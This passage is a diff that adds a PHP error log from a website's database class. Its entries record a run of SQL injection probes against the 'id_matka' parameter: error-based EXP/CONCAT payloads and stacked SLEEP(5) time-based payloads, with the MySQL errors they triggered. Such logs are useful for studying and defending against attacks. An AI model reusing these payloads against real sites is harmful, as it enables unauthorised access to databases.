@@ -1,0 +1,776 @@
+<errorentry>
+	<datetime>2020-04-10 11:05:13</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15,.'".))(()' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '".))(()' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:13</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'oQjAKs<'">wDFIkz' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'oQjAKs<'">wDFIkz' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:27</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78))x)) AND ('JhIy'='JhIy' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:27</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78))x)) AND 'ZtzS'='ZtzS' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78)` from (select concat(0x716a7a7a71,elt((2487 = 2487),1),0x7176716a71,0x78) AS `CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:27</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78))x)) AND ('xTyk' LIKE 'xTyk' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:28</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78))x)) AND 'LBrO' LIKE 'LBrO' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78)` from (select concat(0x716a7a7a71,elt((2487 = 2487),1),0x7176716a71,0x78) AS `CONCAT(0x716a7a7a71,(SELECT (ELT(2487=2487,1))),0x7176716a71,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:33</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78))x)) AND ('AfWU'='AfWU' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1)))' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:33</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78))x)) AND 'Hcen'='Hcen' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78)` from (select concat(0x716a7a7a71,elt((7893 = 7893),1),0x7176716a71,0x78) AS `CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:33</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78))x)) AND ('itOu' LIKE 'itOu' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1)))' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:05:34</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78))x)) AND 'dEfD' LIKE 'dEfD' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78)` from (select concat(0x716a7a7a71,elt((7893 = 7893),1),0x7176716a71,0x78) AS `CONCAT(0x716a7a7a71,(SELECT (ELT(7893=7893,1))),0x7176716a71,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:47</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:47</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:47</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'));SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:47</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')));SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:48</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%');SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:48</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%'));SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:48</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%')));SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:48</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%';SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:49</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') WHERE 1001=1001;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') WHERE 1001=1001;SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:49</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' WHERE 4935=4935;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 4935=4935;SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:49</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'bUxS' FROM DUAL WHERE 4966=4966;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:49</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'jeut' WHERE 9139=9139;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:50</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT VPWC WHERE 6268=6268;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:50</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT 'eeRc' WHERE 8510=8510;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:50</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')) AS bywL WHERE 6855=6855;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS bywL WHERE 6855=6855;SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:50</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AS KXjP WHERE 6815=6815;SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS KXjP WHERE 6815=6815;SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:50</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' IN BOOLEAN MODE);SELECT SLEEP(5)#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'BOOLEAN MODE);SELECT SLEEP(5)#' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:52</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');SELECT SLEEP(5)-- oswV' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT SLEEP(5)-- oswV' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';SELECT SLEEP(5)-- RSPc' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT SLEEP(5)-- RSPc' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');SELECT SLEEP(5) AND ('RoKY'='RoKY' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT SLEEP(5) AND ('RoKY'='RoKY' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'));SELECT SLEEP(5) AND (('hlOf'='hlOf' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));SELECT SLEEP(5) AND (('hlOf'='hlOf' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')));SELECT SLEEP(5) AND ((('YztP'='YztP' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));SELECT SLEEP(5) AND ((('YztP'='YztP' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';SELECT SLEEP(5) AND 'kzLe'='kzLe' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT SLEEP(5) AND 'kzLe'='kzLe' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15');SELECT SLEEP(5) AND ('sQSR' LIKE 'sQSR' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT SLEEP(5) AND ('sQSR' LIKE 'sQSR' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:53</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'));SELECT SLEEP(5) AND (('DiPJ' LIKE 'DiPJ' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));SELECT SLEEP(5) AND (('DiPJ' LIKE 'DiPJ' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:54</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')));SELECT SLEEP(5) AND ((('enfR' LIKE 'enfR' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));SELECT SLEEP(5) AND ((('enfR' LIKE 'enfR' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:54</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15';SELECT SLEEP(5) AND 'kfgG' LIKE 'kfgG' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT SLEEP(5) AND 'kfgG' LIKE 'kfgG' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:55</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%');SELECT SLEEP(5) AND ('%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ');SELECT SLEEP(5) AND ('%'='' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:55</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%'));SELECT SLEEP(5) AND (('%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '));SELECT SLEEP(5) AND (('%'='' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:55</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%')));SELECT SLEEP(5) AND ((('%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')));SELECT SLEEP(5) AND ((('%'='' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:55</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15%';SELECT SLEEP(5) AND '%'='' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'SELECT SLEEP(5) AND '%'='' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:56</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') WHERE 3050=3050;SELECT SLEEP(5)-- nMOW' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') WHERE 3050=3050;SELECT SLEEP(5)-- nMOW' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:56</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15' WHERE 6019=6019;SELECT SLEEP(5)-- oDpa' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'WHERE 6019=6019;SELECT SLEEP(5)-- oDpa' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'Cvuk' FROM DUAL WHERE 7788=7788;SELECT SLEEP(5))||'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5))||'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'||(SELECT 'lHZx' WHERE 1219=1219;SELECT SLEEP(5))||'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5))||'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT xNIW WHERE 2760=2760;SELECT SLEEP(5))+'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5))+'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15'+(SELECT 'ciMU' WHERE 9922=9922;SELECT SLEEP(5))+'' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ';SELECT SLEEP(5))+'' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15')) AS bRRw WHERE 6819=6819;SELECT SLEEP(5)-- wEoP' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS bRRw WHERE 6819=6819;SELECT SLEEP(5)-- wEoP' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:57</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='15') AS NhsR WHERE 8429=8429;SELECT SLEEP(5)-- DLwR' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS NhsR WHERE 8429=8429;SELECT SLEEP(5)-- DLwR' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2020-04-10 11:06:59</datetime>
+	<errornum>E_USER_ERROR</errornum>
